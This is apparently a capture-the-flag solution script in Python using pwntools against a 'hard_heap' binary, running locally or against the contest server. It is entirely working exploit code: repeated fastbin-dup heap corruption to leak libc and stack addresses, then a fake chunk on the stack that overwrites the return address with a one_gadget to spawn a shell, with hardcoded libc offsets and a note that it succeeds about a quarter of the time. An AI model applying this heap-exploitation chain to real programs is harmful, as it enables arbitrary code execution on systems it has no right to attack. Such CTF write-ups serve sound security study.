"""
Note: This randomly segfaults for some reason. Works around 25% of the time.
"""

from pwn import *

e = ELF("./hard_heap")
libc = ELF("./libc.so.6")

if "--remote" in sys.argv:
  p = remote("pwn.hsctf.com", 5555)
else:
  p = process(e.path, env={"LD_PRELOAD": libc.path})

nums = 0
def alloc(size=0x18, data="A" * 8):
  p.sendlineafter(">", "1")
  p.sendlineafter(">", str(size))
  p.sendafter(">", data + ("" if len(data) == size else "\n"))

  global nums
  nums += 1
  return nums - 1
def free(idx):
  p.sendlineafter(">", "3")
  p.sendlineafter(">", str(idx))

def show(idx):
  p.sendlineafter(">", "2")
  p.recvuntil("Which deet would you like to view")
  p.recvline()
  p.sendlineafter("> ", str(idx))

  return p.recvline(keepends=False)

"""
A / B pairs are used for fastbin_dups
C is fake small chunk.

B has a fake size header that just boarders C

"""
A = alloc()
B = alloc(data="A" * 0x10 + p64(0x20))
C = alloc(0x48) # 0x50
A2 = alloc(0x48) # 0x50
B2 = alloc(0x48)
_ = alloc()

"""
First fastbin dup to overwrite C's size header.

Note that we partial overwrite the heap pointer (not needed but saves us a heap leak)
"""
free(A)
free(B)
free(A)

alloc(1, data="\x38")
alloc()
alloc()

"""
0x50 + 0x50 = 0xa0. We extend the size of chunk C to include A2 as well.
"""
alloc(data=p64(0xa1))
free(C)

libc_base = u64(show(C).ljust(8, "\x00")) - 0x7f3af11e4b78 +  0x7f3af0fe0000 
print("Libc Base: {:#x}".format(libc_base))

"""
Second fastbin dup to leak environ (a stack address)
"""
environ = libc_base + 0x7ff4888f2100 - 0x7ff4884c1000
fake_chunk = environ - 0x30 + 5

free(A2)
free(B2)
free(A2)

alloc(0x48, data=p64(fake_chunk))
alloc(0x48)
alloc(0x48)

stack = alloc(0x48, data="A" * (3 + 8 + 0x10 - 1))
show(stack)
stack_base = u64(p.recvline(keepends=False).ljust(8, "\x00"))
print("Stack Leak: {:#x}".format(stack_base))

"""
Third fastbin dup into stack. We use show to setup a fake size header on the stack.
"""
fake_chunk_addr = stack_base - 0xf8 - 0x30 - 4

free(A2)
free(B2)
free(A2)

alloc(0x48, data=p64(fake_chunk_addr))
alloc(0x48)
alloc(0x48)

show(0x51)

"""
Overwrite ret with a one_gadget
"""
alloc(0x48, data="A" * 4 + "A" * 8 + p64(libc_base + 0x45216 - 0x7fab1f336000 + 0x00007fab1f176000))

p.interactive()
